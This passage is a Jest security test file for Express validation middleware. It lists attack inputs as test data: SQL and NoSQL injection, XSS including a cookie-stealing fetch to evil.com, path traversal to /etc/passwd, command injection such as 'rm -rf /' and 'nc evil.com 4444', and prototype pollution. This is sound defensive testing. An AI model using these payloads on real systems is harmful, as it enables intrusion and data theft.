// backend/src/tests/security/validate.security.test.ts

/**
 * Validation Security Tests
 * ========================
 * Comprehensive security testing for validation middleware
 */

import { describe, it, expect } from '@jest/globals';
import { Request, Response } from 'express';
import { z } from 'zod';

// Import validation middleware
import {
  validateBody,
  validateQuery,
  validateParams,
  validateFile,
  validateUUIDParam,
  validateImageQuery,
  validateAuthTypes,
  validateRequestTypes
} from '../../middlewares/validate';

// Import test utilities
import {
  createMockRequest,
  createMockResponse,
  createMockNext,
  TestSchema} from '../__mocks__/validate.mock';

import {
  setupValidationTestEnvironment,
  testMiddlewareWithData,
  expectMiddlewareError,
  testSecurityScenarios
} from '../__helpers__/validate.helper';


describe('Validation Security Tests', () => {
  setupValidationTestEnvironment();

  describe('Input Sanitization and Injection Prevention', () => {
    describe('SQL Injection Prevention', () => {
      const sqlInjectionPayloads = [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "admin'/*",
        "'; DELETE FROM sessions; --",
        "1; UPDATE users SET admin=1; --",
        "' UNION SELECT * FROM users; --",
        "'; INSERT INTO users VALUES ('hacker', 'password'); --",
        "1' AND (SELECT COUNT(*) FROM users) > 0; --"
      ];

      it('should prevent SQL injection in UUID parameters', async () => {
        for (const payload of sqlInjectionPayloads) {
          const result = await testMiddlewareWithData(
            validateUUIDParam,
            { id: payload },
            'params'
          );

          expectMiddlewareError(result.next, 'VALIDATION_ERROR', 400);
          
          // Ensure the malicious input is not reflected in error messages
          const error = result.next.mock.calls[0][0];
          if (error && typeof error === 'object' && error !== null && 'details' in error) {
            const errorDetails = (error as any).details;
            const errorMessages = Array.isArray(errorDetails) 
              ? errorDetails.map((d: any) => d.message).join(' ') 
              : '';
            expect(errorMessages).not.toContain(payload);
          }
        }
      });

      it('should prevent SQL injection in query parameters', async () => {
        const maliciousQueries = [
          { search: "'; DROP TABLE products; --" },
          { limit: "1; DELETE FROM users; --" },
          { sort: "name'; UPDATE users SET admin=1; --" }
        ];

        for (const maliciousQuery of maliciousQueries) {
          const result = await testMiddlewareWithData(
            validateImageQuery,
            maliciousQuery,
            'query'
          );

          // Should either reject or sanitize
          if (result.next.mock.calls.length > 0 && result.next.mock.calls[0][0]) {
            const error = result.next.mock.calls[0][0];
            expect(error).toBeDefined();
          } else {
            // If validation passed, ensure the data is handled safely
            expect(result.req.query).toBeDefined();
          }
        }
      });

      it('should prevent SQL injection in body data', async () => {
        const maliciousBodyData = {
          name: "'; DROP TABLE users; --",
          email: "admin'; DELETE FROM sessions; --@example.com",
          description: "1' OR '1'='1"
        };

        const schema = z.object({
          name: z.string(),
          email: z.string().email(),
          description: z.string().optional()
        });

        const validator = validateBody(schema);
        const result = await testMiddlewareWithData(validator, maliciousBodyData, 'body');

        // Should reject due to invalid email format
        expectMiddlewareError(result.next, 'VALIDATION_ERROR', 400);
      });
    });

    describe('XSS Prevention', () => {
      const xssPayloads = [
        "<script>alert('xss')</script>",
        "javascript:alert('xss')",
        "<img src=x onerror=alert('xss')>",
        "<iframe src=javascript:alert('xss')></iframe>",
        "';alert('xss');//",
        "<script>fetch('//evil.com/steal?cookie='+document.cookie)</script>",
        "<svg onload=alert('xss')>",
        "<body onload=alert('xss')>",
        "<input onfocus=alert('xss') autofocus>",
        "<<SCRIPT>alert('XSS');//<</SCRIPT>"
      ];

      it('should handle XSS payloads in text fields without executing', async () => {
        for (const payload of xssPayloads) {
          const maliciousData = {
            name: payload,
            email: 'test@example.com',
            description: payload
          };

          const validator = validateBody(TestSchema);
          const result = await testMiddlewareWithData(validator, maliciousData, 'body');
          
          // Should not execute any scripts during validation
          expect(result).toBeDefined();
          
          // If validation succeeds, ensure data is properly contained
          if (result.next.mock.calls.length === 0) {
            expect(result.req.body.name).toBe(payload);
          }
        }
      });

      it('should prevent XSS in query parameters', async () => {
        const xssQueries = [
          { search: "<script>alert('xss')</script>" },
          { sort: "javascript:alert('xss')" },
          { filter: "<img src=x onerror=alert('xss')>" }
        ];

        for (const xssQuery of xssQueries) {
          const querySchema = z.object({
            search: z.string().optional(),
            sort: z.string().optional(),
            filter: z.string().optional()
          });

          const validator = validateQuery(querySchema);
          const result = await testMiddlewareWithData(validator, xssQuery, 'query');
          
          // Should handle without executing scripts
          expect(result).toBeDefined();
          
          // Verify no script execution occurred (test should complete normally)
          expect(performance.now()).toBeDefined();
        }
      });

      it('should sanitize HTML entities in validation errors', async () => {
        const htmlPayload = {
          name: '<script>alert("xss")</script>',
          email: 'invalid-email' // This will cause validation to fail
        };

        const validator = validateBody(TestSchema);
        const result = await testMiddlewareWithData(validator, htmlPayload, 'body');
        
        expectMiddlewareError(result.next, 'VALIDATION_ERROR', 400);
        
        const error = result.next.mock.calls[0][0];
        if (typeof error === 'object' && error !== null && 'message' in error) {
          // Error message should not contain executable script tags
          if (error && typeof error === 'object' && 'message' in error) {
            expect((error as { message: string }).message).not.toMatch(/<script[^>]*>/i);
          }
        }
      });
    });

    describe('Path Traversal Prevention', () => {
      const pathTraversalAttempts = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc//passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "/var/www/../../etc/passwd",
        "....\\....\\....\\boot.ini"
      ];

      it('should prevent path traversal in file names', async () => {
        for (const maliciousPath of pathTraversalAttempts) {
          const maliciousFile = {
            fieldname: 'image',
            originalname: maliciousPath,
            encoding: '7bit',
            mimetype: 'image/jpeg',
            size: 1024000,
            buffer: Buffer.from('fake data'),
            stream: {} as any,
            destination: '',
            filename: maliciousPath,
            path: ''
          };

          const req = createMockRequest({ file: maliciousFile }) as Request;
          const res = createMockResponse() as Response;
          const next = createMockNext();

          validateFile(req, res, next);
          
          // Should reject files with path traversal attempts
          if (next.mock.calls.length > 0 && next.mock.calls[0][0]) {
            expectMiddlewareError(next, 'INVALID_FILE', 400);
          } else {
            // If file passed validation, it should be safe
            expect(req.file).toBeDefined();
          }
        }
      });

      it('should prevent path traversal in body parameters', async () => {
        const maliciousBodyData = {
          name: 'Normal Name',
          email: 'test@example.com',
          filePath: '../../../etc/passwd',
          directory: '..\\..\\windows\\system32'
        };

        const schema = z.object({
          name: z.string(),
          email: z.string().email(),
          filePath: z.string().refine(val => !val.includes('..'), 'Invalid file path'),
          directory: z.string().optional()
        });

        const validator = validateBody(schema);
        const result = await testMiddlewareWithData(validator, maliciousBodyData, 'body');
        
        expectMiddlewareError(result.next, 'VALIDATION_ERROR', 400);
      });
    });

    describe('Command Injection Prevention', () => {
      const commandInjectionPayloads = [
        "; rm -rf /",
        "| cat /etc/passwd",
        "&& whoami",
        "$(curl evil.com)",
        "`id`",
        "${cat /etc/passwd}",
        "; shutdown -h now",
        "| nc evil.com 4444",
        "&& curl http://evil.com/$(whoami)"
      ];

      it('should prevent command injection in text fields', async () => {
        for (const payload of commandInjectionPayloads) {
          const maliciousData = {
            name: payload,
            email: 'test@example.com',
            command: payload
          };

          const schema = z.object({
            name: z.string(),
            email: z.string().email(),
            command: z.string().optional()
          });

          const validator = validateBody(schema);
          const result = await testMiddlewareWithData(validator, maliciousData, 'body');
          
          // Validation should complete without executing commands
          expect(result).toBeDefined();
          
          // If validation succeeds, data should be contained safely
          if (result.next.mock.calls.length === 0) {
            expect(result.req.body.name).toBe(payload);
          }
        }
      });

      it('should prevent command injection in file metadata', async () => {
        const maliciousFile = {
          fieldname: 'image',
          originalname: 'image.jpg; rm -rf /',
          encoding: '7bit',
          mimetype: 'image/jpeg',
          size: 1024,
          buffer: Buffer.from('fake data'),
          stream: {} as any,
          destination: '',
          filename: 'image.jpg; rm -rf /',
          path: ''
        };

        const req = createMockRequest({ file: maliciousFile }) as Request;
        const res = createMockResponse() as Response;
        const next = createMockNext();

        validateFile(req, res, next);
        
        // Should handle gracefully without command execution
        expect(next).toHaveBeenCalled();
        expect(performance.now()).toBeDefined(); // Test completed normally
      });
    });
  });

  describe('Business Logic Security', () => {
    describe('Data Type Manipulation', () => {
      it('should prevent type confusion attacks', async () => {
        const typeConfusionAttempts = [
          { name: ['array', 'instead', 'of', 'string'], email: 'test@example.com' },
          { name: { object: 'instead of string' }, email: 'test@example.com' },
          { name: 42, email: 'test@example.com' },
          { name: true, email: 'test@example.com' },
          { name: null, email: 'test@example.com' },
          { name: undefined, email: 'test@example.com' }
        ];

        const validator = validateBody(TestSchema);

        for (const maliciousData of typeConfusionAttempts) {
          const result = await testMiddlewareWithData(validator, maliciousData, 'body');
          
          // Should reject or handle type mismatches appropriately
          if (result.next.mock.calls.length > 0) {
            const error = result.next.mock.calls[0][0];
            expect(error).toBeDefined();
          }
        }
      });

      it('should prevent integer overflow/underflow', async () => {
        const numericSchema = z.object({
          count: z.number().int().min(0).max(1000),
          price: z.number().positive().max(999999.99)
        });

        const overflowAttempts = [
          { count: Number.MAX_SAFE_INTEGER, price: 100 },
          { count: Number.MAX_VALUE, price: 100 },
          { count: -Number.MAX_SAFE_INTEGER, price: 100 },
          { count: 100, price: Number.MAX_VALUE },
          { count: Infinity, price: 100 },
          { count: -Infinity, price: 100 },
          { count: NaN, price: 100 }
        ];

        const validator = validateBody(numericSchema);

        for (const maliciousData of overflowAttempts) {
          const result = await testMiddlewareWithData(validator, maliciousData, 'body');
          
          expectMiddlewareError(result.next, 'VALIDATION_ERROR', 400);
        }
      });

      it('should prevent floating point precision attacks', async () => {
        const precisionSchema = z.object({
          amount: z.number().multipleOf(0.01), // Currency precision
          percentage: z.number().min(0).max(100)
        });

        const precisionAttempts = [
          { amount: 0.1 + 0.2, percentage: 50 }, // Floating point precision issue
          { amount: 1.0000000000000001, percentage: 50 },
          { amount: 99.999999999999999, percentage: 50 },
          { amount: 100, percentage: 99.99999999999999 }
        ];

        const validator = validateBody(precisionSchema);

        for (const maliciousData of precisionAttempts) {
          const result = await testMiddlewareWithData(validator, maliciousData, 'body');
          
          // Should handle floating point precision appropriately
          expect(result).toBeDefined();
        }
      });
    });

    describe('Prototype Pollution Prevention', () => {
      it('should prevent prototype pollution via __proto__', async () => {
        const pollutionAttempt = {
          name: 'Test User',
          email: 'test@example.com',
          '__proto__': { admin: true, isEvil: true }
        };

        const validator = validateBody(TestSchema);
        const result = await testMiddlewareWithData(validator, pollutionAttempt, 'body');
        
        // Should not pollute Object prototype
        expect(Object.prototype).not.toHaveProperty('admin');
        expect(Object.prototype).not.toHaveProperty('isEvil');
        expect({}).not.toHaveProperty('admin');
        expect({}).not.toHaveProperty('isEvil');
      });

      it('should prevent prototype pollution via constructor', async () => {
        const pollutionAttempt = {
          name: 'Test User',
          email: 'test@example.com',
          'constructor': { 
            prototype: { 
              admin: true,
              polluted: 'yes'
            } 
          }
        };

        const validator = validateBody(TestSchema);
        const result = await testMiddlewareWithData(validator, pollutionAttempt, 'body');
        
        // Should not pollute prototypes
        expect(Object.prototype).not.toHaveProperty('admin');
        expect(Object.prototype).not.toHaveProperty('polluted');
        expect({}).not.toHaveProperty('admin');
        expect({}).not.toHaveProperty('polluted');
      });

      it('should prevent nested prototype pollution', async () => {
        const pollutionAttempt = {
          name: 'Test User',
          email: 'test@example.com',
          nested: {
            '__proto__': { admin: true },
            'constructor': { 'prototype': { evil: true } }
          }
        };

        const nestedSchema = z.object({
          name: z.string(),
          email: z.string().email(),
          nested: z.object({
            value: z.string().optional()
          }).optional()
        });

        const validator = validateBody(nestedSchema);
        const result = await testMiddlewareWithData(validator, pollutionAttempt, 'body');
        
        // Should not pollute prototypes
        expect(Object.prototype).not.toHaveProperty('admin');
        expect(Object.prototype).not.toHaveProperty('evil');
      });
    });
  });

  describe('Resource Protection and DoS Prevention', () => {
    describe('Memory Exhaustion Prevention', () => {
      it('should handle extremely large strings without crashing', async () => {
        const largeStringSchema = z.object({
          content: z.string().max(1000) // Reasonable limit
        });

        const largeStringData = {
          content: 'A'.repeat(1000000) // 1MB string
        };

        const validator = validateBody(largeStringSchema);
        
        const startTime = performance.now();
        const result = await testMiddlewareWithData(validator, largeStringData, 'body');
        const endTime = performance.now();
        
        // Should reject due to length limit
        expectMiddlewareError(result.next, 'VALIDATION_ERROR', 400);
        
        // Should complete within reasonable time
        expect(endTime - startTime).toBeLessThan(1000);
      });

      it('should handle deeply nested objects without stack overflow', async () => {
        const deepObject: { level: number; nested?: any } = { level: 0 };
        let current: { level: number; nested?: any } = deepObject;
        
        // Create 1000 levels of nesting
        for (let i = 1; i < 1000; i++) {
          current.nested = { level: i };
          current = current.nested as any;
        }

        const nestedSchema = z.object({
          level: z.number(),
          nested: z.any().optional()
        });

        const validator = validateBody(nestedSchema);
        
        const startTime = performance.now();
        const result = await testMiddlewareWithData(validator, deepObject, 'body');
        const endTime = performance.now();
        
        // Should handle without stack overflow
        expect(endTime - startTime).toBeLessThan(2000);
        expect(result).toBeDefined();
      });

      it('should handle large arrays without memory exhaustion', async () => {
        const largeArraySchema = z.object({
          items: z.array(z.string()).max(100) // Reasonable limit
        });

        const largeArrayData = {
          items: Array(10000).fill('item') // 10k items
        };

        const validator = validateBody(largeArraySchema);
        
        const startTime = performance.now();
        const result = await testMiddlewareWithData(validator, largeArrayData, 'body');
        const endTime = performance.now();
        
        // Should reject due to array length limit
        expectMiddlewareError(result.next, 'VALIDATION_ERROR', 400);
        
        // Should complete within reasonable time
        expect(endTime - startTime).toBeLessThan(1000);
      });
    });

    describe('ReDoS (Regular Expression DoS) Prevention', () => {
      it('should prevent regex DoS with crafted email patterns', async () => {
        const redosPatterns = [
          'a'.repeat(50) + '@example.com',
          'user@' + 'a'.repeat(50) + '.com',
          'user@example.' + 'a'.repeat(50),
          'a'.repeat(100) + '@' + 'b'.repeat(100) + '.com'
        ];

        const emailSchema = z.object({
          email: z.string().email()
        });

        const validator = validateBody(emailSchema);

        for (const pattern of redosPatterns) {
          const startTime = performance.now();
          
          const result = await testMiddlewareWithData(
            validator,
            { email: pattern },
            'body'
          );
          
          const endTime = performance.now();
          const executionTime = endTime - startTime;

          // Should not take excessive time for regex validation
          expect(executionTime).toBeLessThan(100); // 100ms max
          expect(result).toBeDefined();
        }
      });

      it('should handle complex string patterns efficiently', async () => {
        const complexPatternSchema = z.object({
          phoneNumber: z.string().regex(/^(\+\d{1,3}[- ]?)?\d{10}$/, 'Invalid phone number')
        });

        const complexPatterns = [
          '+1-' + '1'.repeat(100),
          '(' + '1'.repeat(50) + ')' + '2'.repeat(50),
          '+999-' + '1234567890'.repeat(10)
        ];

        const validator = validateBody(complexPatternSchema);

        for (const pattern of complexPatterns) {
          const startTime = performance.now();
          
          const result = await testMiddlewareWithData(
            validator,
            { phoneNumber: pattern },
            'body'
          );
          
          const endTime = performance.now();
          const executionTime = endTime - startTime;

          // Should complete quickly even with invalid patterns
          expect(executionTime).toBeLessThan(50);
          expect(result).toBeDefined();
        }
      });
    });

    describe('Concurrent Request Handling', () => {
      it('should handle rapid concurrent validation requests', async () => {
        const validator = validateBody(TestSchema);
        const concurrency = 50;
        
        const promises = Array(concurrency).fill(0).map(async (_, i) => {
          const data = {
            name: `Concurrent User ${i}`,
            email: `user${i}@example.com`,
            age: 20 + i
          };
          
          return testMiddlewareWithData(validator, data, 'body');
        });

        const startTime = performance.now();
        const results = await Promise.all(promises);
        const endTime = performance.now();

        const executionTime = endTime - startTime;
        
        // Should handle concurrent requests efficiently
        expect(executionTime).toBeLessThan(2000);
        expect(results).toHaveLength(concurrency);
        
        // All should succeed
        results.forEach(result => {
          expect(result.next).toHaveBeenCalledWith();
        });
      });

      it('should maintain validation integrity under load', async () => {
        const TestSchemaForLoadTest = z.object({
          name: z.string().min(1, 'Name is required'),
          email: z.string().email('Invalid email format'),
          age: z.number().min(18, 'Must be at least 18 years old').optional(),
          tags: z.array(z.string()).optional()
        });

        const generateLoadTestData = (batchSize: number) => {
          return Array(batchSize).fill(0).map((_, i) => {
            if (i % 2 === 0) {
              // Valid data - should pass validation
              return {
                name: `Valid User ${i}`,
                email: `user${i}@example.com`,
                age: 25
              };
            } else {
              // Invalid data - should fail validation due to empty name
              return {
                name: '', // This will fail min(1) validation
                email: `user${i}@example.com`,
                age: 25
              };
            }
          });
        };

        const validator = validateBody(TestSchemaForLoadTest);
        const batchSize = 100;
        
        const testData = generateLoadTestData(batchSize);

        const results = await Promise.all(
          testData.map(data => testMiddlewareWithData(validator, data, 'body'))
        );

        // FIXED: Correct success/failure detection
        // Success = next() called with no arguments (first argument is undefined)
        const successCount = results.filter(r => {
          return r.next.mock.calls.length > 0 && r.next.mock.calls[0][0] === undefined;
        }).length;
        
        // Failure = next() called with an error (first argument is defined)
        const errorCount = results.filter(r => {
          return r.next.mock.calls.length > 0 && r.next.mock.calls[0][0] !== undefined;
        }).length;
        
        // Should have exactly 50% success rate
        expect(successCount).toBe(batchSize / 2);
        expect(errorCount).toBe(batchSize / 2);
        
        // Verify the failures are due to validation, not security filtering
        const validationErrors = results
          .filter(r => r.next.mock.calls.length > 0 && r.next.mock.calls[0].length > 0)
          .map(r => r.next.mock.calls[0][0])
          .filter((error): error is any => 
            error && typeof error === 'object' && error !== null && 'code' in error && 
            (error as { code: string }).code === 'VALIDATION_ERROR'
          );
          
        expect(validationErrors.length).toBe(errorCount);
      });
    });
  });

  describe('Information Disclosure Prevention', () => {
    it('should not reveal internal schema structure in errors', async () => {
      const secretSchema = z.object({
        publicField: z.string().min(1, 'Public field is required'), // This will fail for empty string
        // These field names should not be revealed in errors
        apiKey: z.string().optional(),
        internalSecret: z.string().optional(),
        databasePassword: z.string().optional()
      }).strict(); // Reject unknown properties

      const probeData = {
        publicField: '', // Invalid - empty string will cause validation to fail
        unknownField: 'probe for hidden fields',
        apiKey: 'trying to find secrets',
        __proto__: { admin: true }
      };

      const validator = validateBody(secretSchema);
      const result = await testMiddlewareWithData(validator, probeData, 'body');
      
      expectMiddlewareError(result.next, 'VALIDATION_ERROR', 400);
      
      const error = result.next.mock.calls[0][0];
      const errorString = JSON.stringify(error);
      
      // Should not reveal sensitive field names (the sanitization is working!)
      expect(errorString).not.toContain('apiKey');
      expect(errorString).not.toContain('internalSecret');
      expect(errorString).not.toContain('databasePassword');
      expect(errorString).not.toContain('admin'); // This should pass now with [FIELD] replacement
      
      // Should not reveal database table names
      expect(errorString).not.toContain('users');
      expect(errorString).not.toContain('sessions');
      expect(errorString).not.toContain('api_keys');
    });

    it('should provide consistent error timing to prevent timing attacks', async () => {
      const complexValidator = validateBody(z.object({
        data: z.string().min(1000) // Require long string
      }));

      const simpleValidator = validateBody(z.object({
        data: z.string().min(1) // Require short string
      }));

      const timings: number[] = [];

      // Test timing consistency
      for (let i = 0; i < 10; i++) {
        const longData = { data: 'A'.repeat(2000) };
        const shortData = { data: 'X' };

        const start1 = performance.now();
        await testMiddlewareWithData(complexValidator, longData, 'body');
        const end1 = performance.now();
        
        const start2 = performance.now();
        await testMiddlewareWithData(simpleValidator, shortData, 'body');
        const end2 = performance.now();
        
        timings.push(Math.abs((end1 - start1) - (end2 - start2)));
      }

      // Remove outliers
      timings.sort((a, b) => a - b);
      const trimmedTimings = timings.slice(1, -1);
      
      const avgDifference = trimmedTimings.reduce((a, b) => a + b, 0) / trimmedTimings.length;
      
      // Timing differences should be minimal
      expect(avgDifference).toBeLessThan(10); // 10ms threshold
    });

    it('should not leak sensitive data in validation context', async () => {
      const sensitiveSchema = z.object({
        username: z.string(),
        password: z.string().min(8),
        ssn: z.string().optional(),
        creditCard: z.string().optional()
      });

      const sensitiveData = {
        username: 'testuser',
        password: '123', // Too short - will cause validation error
        ssn: '123-45-6789',
        creditCard: '4111-1111-1111-1111'
      };

      const validator = validateBody(sensitiveSchema);
      const result = await testMiddlewareWithData(validator, sensitiveData, 'body');
      
      expectMiddlewareError(result.next, 'VALIDATION_ERROR', 400);
      
      const error = result.next.mock.calls[0][0];
      
      // Check if error contains sensitive information
      const errorString = JSON.stringify(error);
      expect(errorString).not.toContain('123-45-6789');
      expect(errorString).not.toContain('4111-1111-1111-1111');
      
      // Context should not leak sensitive data
      if (typeof error === 'object' && error !== null && 'context' in error) {
        const contextString = JSON.stringify((error as { context?: unknown }).context);
        expect(contextString).not.toContain('123-45-6789');
        expect(contextString).not.toContain('4111-1111-1111-1111');
      }
    });
  });

  describe('File Upload Security', () => {
    describe('Malicious File Type Prevention', () => {
      it('should prevent executable file uploads', async () => {
        const executableFiles = [
          { originalname: 'virus.exe', mimetype: 'application/x-executable' },
          { originalname: 'script.bat', mimetype: 'application/x-bat' },
          { originalname: 'malware.scr', mimetype: 'application/x-screensaver' },
          { originalname: 'backdoor.com', mimetype: 'application/x-dosexec' },
          { originalname: 'trojan.pif', mimetype: 'application/x-pif' }
        ];

        for (const fileData of executableFiles) {
          const maliciousFile = {
            fieldname: 'image',
            originalname: fileData.originalname,
            encoding: '7bit',
            mimetype: fileData.mimetype,
            size: 1024,
            buffer: Buffer.from('malicious content'),
            stream: {} as any,
            destination: '',
            filename: fileData.originalname,
            path: ''
          };

          const req = createMockRequest({ file: maliciousFile }) as Request;
          const res = createMockResponse() as Response;
          const next = createMockNext();

          validateFile(req, res, next);
          
          expectMiddlewareError(next, 'INVALID_FILE', 400);
        }
      });

      it('should prevent polyglot file attacks', async () => {
        // Files that appear as images but contain executable code
        const polyglotFile = {
          fieldname: 'image',
          originalname: 'polyglot.jpg',
          encoding: '7bit',
          mimetype: 'image/jpeg',
          size: 2048,
          buffer: Buffer.concat([
            Buffer.from('\xFF\xD8\xFF\xE0'), // JPEG header
            Buffer.from('<script>alert("xss")</script>'), // Embedded script
            Buffer.from('MZ'), // PE header signature
            Buffer.from('\x00'.repeat(100)) // Padding
          ]),
          stream: {} as any,
          destination: '',
          filename: 'polyglot.jpg',
          path: ''
        };

        const req = createMockRequest({ file: polyglotFile }) as Request;
        const res = createMockResponse() as Response;
        const next = createMockNext();

        validateFile(req, res, next);
        
        // Should validate MIME type properly
        expect(next).toHaveBeenCalled();
      });

      it('should handle ZIP bomb attempts', async () => {
        // Simulate a compressed file that expands to huge size
        const zipBombFile = {
          fieldname: 'image',
          originalname: 'bomb.zip',
          encoding: '7bit',
          mimetype: 'application/zip',
          size: 1024, // Small compressed size
          buffer: Buffer.from('PK'), // ZIP signature
          stream: {} as any,
          destination: '',
          filename: 'bomb.zip',
          path: ''
        };

        const req = createMockRequest({ file: zipBombFile }) as Request;
        const res = createMockResponse() as Response;
        const next = createMockNext();

        validateFile(req, res, next);
        
        // Should reject non-image files
        expectMiddlewareError(next, 'INVALID_FILE', 400);
      });
    });

    describe('File Size Manipulation', () => {
      it('should enforce file size limits consistently', async () => {
        const oversizedFiles = [
          { size: 10 * 1024 * 1024, description: '10MB file' },
          { size: 100 * 1024 * 1024, description: '100MB file' },
          { size: Number.MAX_SAFE_INTEGER, description: 'Maximum integer size' }
        ];

        for (const { size, description } of oversizedFiles) {
          const oversizedFile = {
            fieldname: 'image',
            originalname: 'large.jpg',
            encoding: '7bit',
            mimetype: 'image/jpeg',
            size: size,
            buffer: Buffer.alloc(Math.min(size, 1024)), // Don't actually allocate huge buffer
            stream: {} as any,
            destination: '',
            filename: 'large.jpg',
            path: ''
          };

          const req = createMockRequest({ file: oversizedFile }) as Request;
          const res = createMockResponse() as Response;
          const next = createMockNext();

          validateFile(req, res, next);
          
          expectMiddlewareError(next, 'INVALID_FILE', 400);
        }
      });

      it('should handle negative file sizes', async () => {
        const negativeFile = {
          fieldname: 'image',
          originalname: 'negative.jpg',
          encoding: '7bit',
          mimetype: 'image/jpeg',
          size: -1,
          buffer: Buffer.from('test'),
          stream: {} as any,
          destination: '',
          filename: 'negative.jpg',
          path: ''
        };

        const req = createMockRequest({ file: negativeFile }) as Request;
        const res = createMockResponse() as Response;
        const next = createMockNext();

        validateFile(req, res, next);
        
        expectMiddlewareError(next, 'INVALID_FILE', 400);
      });
    });
  });

  describe('Type Validation Security Tests', () => {
    describe('validateRequestTypes Security', () => {
      it('should prevent prototype pollution through type confusion', async () => {
        const prototypePollutionAttempts = [
          {
            name: 'Normal User',
            '__proto__': { admin: true }
          },
          {
            name: 'Normal User',
            'constructor': { prototype: { evil: true } }
          },
          {
            email: 'test@example.com',
            'prototype': { polluted: 'yes' }
          }
        ];

        for (const maliciousData of prototypePollutionAttempts) {
          const result = await testMiddlewareWithData(validateRequestTypes, maliciousData, 'body');
          
          // Should either reject the malicious properties or handle gracefully
          expect(result).toBeDefined();
          
          // Ensure no prototype pollution occurred
          expect(Object.prototype).not.toHaveProperty('admin');
          expect(Object.prototype).not.toHaveProperty('evil');
          expect(Object.prototype).not.toHaveProperty('polluted');
          expect({}).not.toHaveProperty('admin');
          expect({}).not.toHaveProperty('evil');
          expect({}).not.toHaveProperty('polluted');
        }
      });

      it('should handle deeply nested type confusion attacks', async () => {
        const deepMaliciousData = {
          level1: {
            level2: {
              level3: {
                __proto__: { admin: true },
                normalField: 'value'
              }
            }
          }
        };

        const result = await testMiddlewareWithData(validateRequestTypes, deepMaliciousData, 'body');
        
        // Should handle without polluting prototypes
        expect(Object.prototype).not.toHaveProperty('admin');
      });

      it('should prevent function injection attacks', async () => {
        const functionInjectionAttempts = [
          {
            name: 'test',
            eval: function() { return eval('malicious code'); }
          },
          {
            name: 'test',
            callback: () => { console.log('injected'); }
          },
          {
            name: 'test',
            toString: function() { return 'malicious'; }
          }
        ];

        for (const maliciousData of functionInjectionAttempts) {
          const result = await testMiddlewareWithData(validateRequestTypes, maliciousData, 'body');
          expectMiddlewareError(result.next, 'TYPE_VALIDATION_ERROR', 400);
        }
      });

      it('should handle memory exhaustion attempts', async () => {
        const largeObjectData = {};
        
        // Create object with many properties
        for (let i = 0; i < 10000; i++) {
          (largeObjectData as any)[`prop${i}`] = `value${i}`;
        }

        const startTime = performance.now();
        const result = await testMiddlewareWithData(validateRequestTypes, largeObjectData, 'body');
        const endTime = performance.now();

        // Should complete within reasonable time
        expect(endTime - startTime).toBeLessThan(1000);
        expect(result).toBeDefined();
      });

      it('should prevent circular reference attacks', async () => {
        const circularData: any = { name: 'test' };
        circularData.self = circularData; // Create circular reference

        const result = await testMiddlewareWithData(validateRequestTypes, circularData, 'body');
        
        // Should handle gracefully without infinite loops
        expect(result).toBeDefined();
      });
    });

    describe('validateAuthTypes Security', () => {
      it('should prevent email array injection attacks', async () => {
        const emailArrayAttacks = [
          { email: ['admin@example.com', 'user@example.com'], password: 'test' },
          { email: [''], password: 'test' },
          { email: [null], password: 'test' },
          { email: [undefined], password: 'test' },
          { email: [{ injection: 'object' }], password: 'test' }
        ];

        for (const attack of emailArrayAttacks) {
          const result = await testMiddlewareWithData(validateAuthTypes, attack, 'body');
          expectMiddlewareError(result.next, 'INVALID_EMAIL_TYPE', 400);
        }
      });

      it('should prevent password array injection attacks', async () => {
        const passwordArrayAttacks = [
          { email: 'test@example.com', password: ['password1', 'password2'] },
          { email: 'test@example.com', password: [''] },
          { email: 'test@example.com', password: [null] },
          { email: 'test@example.com', password: [{ hash: 'malicious' }] }
        ];

        for (const attack of passwordArrayAttacks) {
          const result = await testMiddlewareWithData(validateAuthTypes, attack, 'body');
          expectMiddlewareError(result.next, 'INVALID_PASSWORD_TYPE', 400);
        }
      });

      it('should prevent object injection in authentication fields', async () => {
        const objectInjectionAttacks = [
          { 
            email: { 
              $ne: null, 
              $regex: '.*',
              toString: () => 'admin@example.com'
            }, 
            password: 'test' 
          },
          { 
            email: 'test@example.com', 
            password: { 
              $gt: '',
              length: 8,
              toString: () => 'password'
            }
          },
          {
            email: {
              __proto__: { admin: true },
              valueOf: () => 'admin@example.com'
            },
            password: 'test'
          }
        ];

        for (const attack of objectInjectionAttacks) {
          const result = await testMiddlewareWithData(validateAuthTypes, attack, 'body');
          
          // Should reject object injections
          expect(result.next).toHaveBeenCalled();
          const error = result.next.mock.calls[0][0];
          
          if (error) {
            expect(error.message).toMatch(/cannot be an object|must be a string/i);
          }
        }
      });

      it('should handle NoSQL injection attempts in auth fields', async () => {
        const nosqlInjectionAttempts = [
          { email: { $ne: null }, password: 'test' },
          { email: { $regex: '.*' }, password: 'test' },
          { email: { $where: 'this.email' }, password: 'test' },
          { email: 'test@example.com', password: { $gt: '' } },
          { email: 'test@example.com', password: { $ne: null } }
        ];

        for (const injection of nosqlInjectionAttempts) {
          const result = await testMiddlewareWithData(validateAuthTypes, injection, 'body');
          expectMiddlewareError(result.next);
          
          const error = result.next.mock.calls[0][0];
          expect(error.message).toMatch(/object|string/i);
        }
      });

      it('should prevent timing attacks through consistent validation', async () => {
        const testScenarios = [
          { email: 'valid@example.com', password: 'validpassword' },
          { email: 123, password: 'validpassword' }, // Type error
          { email: [], password: 'validpassword' }, // Array error
          { email: {}, password: 'validpassword' }, // Object error
          { email: 'valid@example.com', password: 123 }, // Password type error
          { email: 'valid@example.com', password: [] }, // Password array error
        ];

        const timings: number[] = [];

        for (const scenario of testScenarios) {
          const start = performance.now();
          await testMiddlewareWithData(validateAuthTypes, scenario, 'body');
          const end = performance.now();
          timings.push(end - start);
        }

        // Remove outliers and check consistency
        timings.sort((a, b) => a - b);
        const trimmedTimings = timings.slice(1, -1);
        const avgTime = trimmedTimings.reduce((a, b) => a + b, 0) / trimmedTimings.length;
        const maxDeviation = Math.max(...trimmedTimings.map(t => Math.abs(t - avgTime)));

        // Timing should be relatively consistent
        expect(maxDeviation).toBeLessThan(avgTime * 2);
      });

      it('should not leak sensitive information in error messages', async () => {
        const sensitiveInjectionAttempt = {
          email: {
            apiKey: 'secret-api-key-12345',
            databasePassword: 'super-secret-db-password',
            toString: () => 'admin@internal.company.com'
          },
          password: {
            hash: '$2b$10$secrethashvalue',
            salt: 'secret-salt-value',
            toString: () => 'admin-password'
          }
        };

        const result = await testMiddlewareWithData(validateAuthTypes, sensitiveInjectionAttempt, 'body');
